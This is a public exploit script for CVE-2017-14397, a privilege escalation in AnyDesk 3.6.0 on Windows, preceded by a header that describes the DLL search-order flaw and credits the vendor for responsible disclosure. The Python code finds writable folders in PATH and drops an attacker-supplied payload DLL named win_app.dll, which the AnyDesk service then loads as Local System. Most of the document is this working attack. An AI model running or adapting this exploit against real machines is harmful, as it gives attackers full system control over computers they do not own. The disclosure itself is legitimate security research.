#
# Title : AnyDesk 3.6.0 - Privilege Escalation
# Date : 18/10/2017
# Author : 0x09AL (https://twitter.com/0x09AL)
# CVE : CVE-2017-14397
# Tested on: AnyDesk 3.6.0 - Windows 7 
# Vendor : https://www.anydesk.com/
# Vulnerability Description:
# When AnyDesk is installed a service named AnyDesk is installed also and runs as Local System.
# In the code there is a call to LoadLibrary("win_app.dll") which causes this problem.
# By default when LoadLibrary isn't called with full path Windows will search the actual directory and then the ones that are in the PATH environment. 
# To Exploit this vulnerability when need to put a DLL payload in a writable PATH directory.
# Generate a DLL Payload and name it payload.dll.
# The exploit below will try to find the PATH env folders that are writable and will drop the payload.dll there.
# When the service is restarted or when the computer starts up the payload will execute with the highest privilege.
#
# I would like to thank the AnyDesk team (Olaf Liebe,Andreas Mahler) for the pleasant responsible disclosure experience.
#


import wmi
import os 
import shutil


def isWritable(path):
	try:
		file = path + "\\.tempfile"
		tmp = open(file,"w")
		tmp.close()
		return True
	except IOError as e:
		pass
		return False
		
		
		

AnyDeskService = wmi.WMI().Win32_Service(Name="Anydesk",State="Running")

if(AnyDeskService != []):
	print "[+] Found AnyDesk Service [+]"
	folders = os.environ['PATH'].split(";")

	for folder in folders:
		if(isWritable(folder)):
			print "[+] Found writable folder %s [+]" % folder
			print "[+] Copying payload to %s\\win_app.dll [+]" % folder
			shutil.copyfile("payload.dll",folder + "\\win_app.dll")
			

		
else:
	print "[-] AnyDeskService not found [-]"